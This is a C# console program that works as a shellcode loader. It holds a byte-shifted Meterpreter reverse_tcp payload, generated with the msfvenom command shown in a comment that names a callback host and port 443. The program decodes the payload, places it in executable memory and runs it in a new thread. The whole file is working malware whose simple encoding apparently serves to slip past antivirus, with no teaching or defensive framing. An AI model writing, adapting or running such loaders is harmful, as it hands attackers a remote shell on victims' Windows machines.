﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
 uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
        UInt32 dwMilliseconds);

        static void Main(string[] args)
//msfvenom -p windows/x64/meterpreter/reverse_tcp 
//LHOST=192.168.93.128 LPORT=443 EXITFUNC=thread -f csharp
        {
            byte[] buf = new byte[511] { 0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x53, 0x58, 0x4a, 0x33, 0xd4, 0x67, 0x4a, 0x8d, 0x54, 0x62, 0x4a, 0x8d, 0x54, 0x1a, 0x4a, 0x8d, 0x54, 0x22, 0x4a, 0x8d, 0x74, 0x52, 0x4f, 0x33, 0xcb, 0x4a, 0x11, 0xb9, 0x4c, 0x4c, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe4, 0xef, 0x54, 0x43, 0x53, 0x4a, 0x8d, 0x54, 0x22, 0x8d, 0x44, 0x3e, 0x4a, 0x03, 0xd2, 0x68, 0x83, 0x7a, 0x1a, 0x0d, 0x04, 0x11, 0x87, 0x74, 0x02, 0x02, 0x02, 0x8d, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x69, 0x4a, 0x03, 0xd2, 0x52, 0x46, 0x8d, 0x42, 0x22, 0x8d, 0x4a, 0x1a, 0x4b, 0x03, 0xd2, 0xe5, 0x58, 0x4f, 0x33, 0xcb, 0x4a, 0x01, 0xcb, 0x43, 0x8d, 0x36, 0x8a, 0x4a, 0x03, 0xd8, 0x4a, 0x33, 0xc2, 0x43, 0xc3, 0xcb, 0x0f, 0xae, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x4e, 0x05, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xda, 0x5a, 0x46, 0x8d, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x68, 0x43, 0x8d, 0x0e, 0x4a, 0x46, 0x8d, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x43, 0x8d, 0x06, 0x8a, 0x43, 0x5a, 0x43, 0x5a, 0x60, 0x5b, 0x4a, 0x03, 0xd2, 0x5c, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x5c, 0x4a, 0x85, 0xee, 0x22, 0x43, 0x54, 0x01, 0xe2, 0x5a, 0x43, 0x5b, 0x5c, 0x4a, 0x8d, 0x14, 0xeb, 0x4d, 0x01, 0x01, 0x01, 0x5f, 0x4b, 0xc0, 0x79, 0x75, 0x34, 0x61, 0x35, 0x34, 0x02, 0x02, 0x43, 0x58, 0x4b, 0x8b, 0xe8, 0x4a, 0x83, 0xee, 0xa2, 0x03, 0x02, 0x02, 0x4b, 0x8b, 0xe7, 0x4b, 0xbe, 0x04, 0x02, 0x03, 0xbd, 0xc2, 0xaa, 0x5f, 0x82, 0x43, 0x56, 0x4b, 0x8b, 0xe6, 0x4e, 0x8b, 0xf3, 0x43, 0xbc, 0x4e, 0x79, 0x28, 0x09, 0x01, 0xd7, 0x4e, 0x8b, 0xec, 0x6a, 0x03, 0x03, 0x02, 0x02, 0x5b, 0x43, 0xbc, 0x2b, 0x82, 0x6d, 0x02, 0x01, 0xd7, 0x6c, 0x0c, 0x43, 0x60, 0x52, 0x52, 0x4f, 0x33, 0xcb, 0x4f, 0x33, 0xc2, 0x4a, 0x01, 0xc2, 0x4a, 0x8b, 0xc4, 0x4a, 0x01, 0xc2, 0x4a, 0x8b, 0xc3, 0x43, 0xbc, 0xec, 0x11, 0xe1, 0xe2, 0x01, 0xd7, 0x4a, 0x8b, 0xc9, 0x6c, 0x12, 0x43, 0x5a, 0x4e, 0x8b, 0xe4, 0x4a, 0x8b, 0xfb, 0x43, 0xbc, 0x9b, 0xa7, 0x76, 0x63, 0x01, 0xd7, 0x87, 0xc2, 0x76, 0x0c, 0x4b, 0x01, 0xd0, 0x77, 0xe7, 0xea, 0x95, 0x02, 0x02, 0x02, 0x4a, 0x85, 0xee, 0x12, 0x4a, 0x8b, 0xe4, 0x4f, 0x33, 0xcb, 0x6c, 0x06, 0x43, 0x5a, 0x4a, 0x8b, 0xfb, 0x43, 0xbc, 0x04, 0xdb, 0xca, 0x61, 0x01, 0xd7, 0x85, 0xfa, 0x02, 0x80, 0x57, 0x4a, 0x85, 0xc6, 0x22, 0x60, 0x8b, 0xf8, 0x6c, 0x42, 0x43, 0x5b, 0x6a, 0x02, 0x12, 0x02, 0x02, 0x43, 0x5a, 0x4a, 0x8b, 0xf4, 0x4a, 0x33, 0xcb, 0x43, 0xbc, 0x5a, 0xa6, 0x55, 0xe7, 0x01, 0xd7, 0x4a, 0x8b, 0xc5, 0x4b, 0x8b, 0xc9, 0x4f, 0x33, 0xcb, 0x4b, 0x8b, 0xf2, 0x4a, 0x8b, 0xdc, 0x4a, 0x8b, 0xfb, 0x43, 0xbc, 0x04, 0xdb, 0xca, 0x61, 0x01, 0xd7, 0x85, 0xfa, 0x02, 0x7f, 0x2a, 0x5a, 0x43, 0x59, 0x5b, 0x6a, 0x02, 0x42, 0x02, 0x02, 0x43, 0x5a, 0x6c, 0x02, 0x5c, 0x43, 0xbc, 0x0d, 0x31, 0x11, 0x32, 0x01, 0xd7, 0x59, 0x5b, 0x43, 0xbc, 0x77, 0x70, 0x4f, 0x63, 0x01, 0xd7, 0x4b, 0x01, 0xd0, 0xeb, 0x3e, 0x01, 0x01, 0x01, 0x4a, 0x03, 0xc5, 0x4a, 0x2b, 0xc8, 0x4a, 0x87, 0xf8, 0x77, 0xb6, 0x43, 0x01, 0xe9, 0x5a, 0x6c, 0x02, 0x5b, 0xbd, 0xe2, 0x1f, 0x2c, 0x0c, 0x43, 0x8b, 0xdc, 0x01, 0xd7 };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}